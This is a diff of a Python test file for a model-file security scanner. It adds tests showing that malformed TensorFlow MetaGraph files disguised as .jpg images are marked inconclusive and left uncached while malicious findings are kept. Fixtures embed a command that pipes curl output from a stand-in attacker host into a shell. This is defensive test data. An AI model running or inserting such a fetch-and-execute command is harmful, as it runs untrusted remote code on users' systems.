@@ -20,7 +20,7 @@ from modelaudit.cache.optimized_config import normalize_material_scan_config
 from modelaudit.core import scan_file, scan_model_directory_or_file
 from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
 from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
-from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES
+from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES, METAGRAPH_PARSE_INCONCLUSIVE_REASON
 from modelaudit.utils.file.detection import PROTOBUF_MODEL_CANDIDATE_FORMAT
 from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
 from tests.helpers import (
@@ -58,6 +58,29 @@ def _build_malicious_tf_metagraph() -> bytes:
     node.name = "pyfunc_node"
     node.op = "PyFunc"
     node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_benign_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    node = metagraph.graph_def.node.add()
+    node.name = "const_node"
+    node.op = "Const"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_malicious_collection_only_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.graph_def.versions.producer = 1
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(
+        b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'",
+    )
     return cast(bytes, metagraph.SerializeToString())
 
 
@@ -2070,6 +2093,73 @@ def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: P
         and issue.details.get("op_type") == "PyFunc"
         for issue in result.issues
     )
+
+
+def test_scan_file_marks_malformed_renamed_tf_metagraph_inconclusive_and_uncached(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "malformed.jpg"
+    disguised_metagraph.write_bytes(_build_benign_tf_metagraph() + b"\xff")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        result = scan_file(str(disguised_metagraph), config=config)
+        repeated_result = scan_file(str(disguised_metagraph), config=config)
+
+        assert result.scanner_name == "tf_metagraph"
+        assert result.success is False
+        assert repeated_result.success is False
+        assert result.metadata["scan_outcome"] == "inconclusive"
+        assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+def test_scan_file_preserves_malicious_findings_from_malformed_renamed_tf_metagraph(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "malicious-tail.jpg"
+    disguised_metagraph.write_bytes(_build_malicious_tf_metagraph() + b"\xff")
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.message == "Dangerous TensorFlow operation: PyFunc"
+        and issue.details.get("op_type") == "PyFunc"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
+
+
+def test_scan_file_preserves_collection_findings_from_malformed_renamed_tf_metagraph(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "collection-tail.jpg"
+    disguised_metagraph.write_bytes(_build_malicious_collection_only_tf_metagraph() + b"\xff")
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        issue.severity == IssueSeverity.WARNING
+        and issue.message == "Collection metadata contains command+network pattern in executable key context"
+        and issue.details.get("collection_key") == "runtime_hook"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
 
 
 def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
